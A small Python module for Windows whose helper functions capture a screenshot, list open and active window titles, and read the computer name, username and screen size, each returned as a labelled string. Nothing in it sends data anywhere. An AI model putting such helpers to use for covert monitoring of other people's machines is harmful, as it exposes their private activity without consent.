from win32api import GetSystemMetrics, GetUserName, GetComputerName
from pyautogui import getAllTitles, getActiveWindowTitle, screenshot


def getActiveWinTitle():
    """
    :return: Active Window Title
    """
    return f'Active window: "{getActiveWindowTitle()}"'


def getAllWinTitles():
    """
    Sorting
    Clearing <"">
    :return: All Titles
    """
    titles = getAllTitles()
    sorted_titles = []

    for title in titles:
        if title:
            sorted_titles.append(title)

    return "\n".join(sorted_titles)


def getScreenshot(path):
    """
    :param path: -- "Directory"
    :return: "Full file path"
    """
    path += "scr.png"
    screenshot(path)
    return path


def get_computer_name():
    """
    :return: Computer Name
    """
    return f'Computer name: "{GetComputerName()}"'


def get_user_name():
    """
    :return: Username
    """
    return f'Username: "{GetUserName()}"'


def get_sys_metrics():
    """
    :return: SysMetrics <Width: int; Height: int;>
    """
    return f'Width: {GetSystemMetrics(0)}; Height: {GetSystemMetrics(1)};'
